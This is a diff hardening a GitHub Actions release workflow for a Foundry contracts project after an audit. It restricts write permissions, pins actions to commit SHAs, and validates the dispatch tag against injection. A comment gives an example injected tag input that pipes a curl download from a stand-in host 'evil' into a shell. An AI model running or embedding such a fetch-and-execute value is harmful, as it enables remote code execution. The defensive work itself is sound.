@@ -10,8 +10,11 @@ on:
         description: "Tag to release (must already exist on origin)"
         required: true
 
+# AUDIT R056 MED: workflow-scope is contents: read; only the release job
+# opts in to contents: write. A compromise of a build dependency cannot
+# push tags or rewrite history.
 permissions:
-  contents: write
+  contents: read
 
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
@@ -20,26 +23,51 @@ concurrency:
 jobs:
   release:
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
     steps:
       - name: Checkout
-        uses: actions/checkout@v4
+        # AUDIT R056: SHA-pinned actions (was @v4 floating).
+        uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7
         with:
           submodules: recursive
           fetch-depth: 0 # needed so `git log` can diff against previous tag
 
+      # AUDIT R056 MED: pre-flight strict-semver validator. A maliciously
+      # crafted dispatch input like `v1.0.0\n$(curl evil|sh)` would have
+      # been interpolated into the bash heredoc below; gate first to fail
+      # fast, env-passthrough below for shell-injection safety.
+      - name: Validate dispatch tag input
+        if: github.event_name == 'workflow_dispatch'
+        env:
+          INPUT_TAG: ${{ inputs.tag }}
+        run: |
+          if ! [[ "$INPUT_TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-(rc|beta|alpha|pre)\.[0-9]+)?$ ]]; then
+            echo "Invalid tag format: $INPUT_TAG"
+            exit 1
+          fi
+
       - name: Resolve tag
         id: tag
+        env:
+          INPUT_TAG: ${{ inputs.tag }}
         run: |
           if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            echo "value=${{ github.event.inputs.tag }}" >> "$GITHUB_OUTPUT"
+            # Re-validate as defence in depth.
+            if ! [[ "$INPUT_TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-(rc|beta|alpha|pre)\.[0-9]+)?$ ]]; then
+              echo "Invalid tag format: $INPUT_TAG"
+              exit 1
+            fi
+            echo "value=$INPUT_TAG" >> "$GITHUB_OUTPUT"
           else
             echo "value=${GITHUB_REF#refs/tags/}" >> "$GITHUB_OUTPUT"
           fi
 
       - name: Generate release notes
         id: notes
+        env:
+          TAG: ${{ steps.tag.outputs.value }}
         run: |
-          TAG="${{ steps.tag.outputs.value }}"
           PREV=$(git describe --tags --abbrev=0 "${TAG}^" 2>/dev/null || echo "")
           echo "## What's changed in ${TAG}" > NOTES.md
           echo "" >> NOTES.md
@@ -54,7 +82,7 @@ jobs:
           echo "Full changelog: [CHANGELOG.md](../blob/${TAG}/CHANGELOG.md)" >> NOTES.md
 
       - name: Install Foundry
-        uses: foundry-rs/foundry-toolchain@v1
+        uses: foundry-rs/foundry-toolchain@de808b1eea699e761c404bda44ba8f21aba30b2c # v1.3.1
         with:
           version: stable
 
@@ -63,15 +91,17 @@ jobs:
         run: forge build
 
       - name: Package compiled artifacts
+        env:
+          TAG: ${{ steps.tag.outputs.value }}
         run: |
           mkdir -p dist
           # Strip unused test artifacts, keep only src contract outputs
-          tar -czf dist/contracts-${{ steps.tag.outputs.value }}.tar.gz \
+          tar -czf "dist/contracts-${TAG}.tar.gz" \
             -C contracts/out \
             $(ls contracts/out | grep -v '\.t\.sol$' || true) || true
 
       - name: Create GitHub Release
-        uses: softprops/action-gh-release@v2
+        uses: softprops/action-gh-release@c062e08bd532815e2082a85e87e3ef29c3e6d191 # v2.0.8
         with:
           tag_name: ${{ steps.tag.outputs.value }}
           name: ${{ steps.tag.outputs.value }}
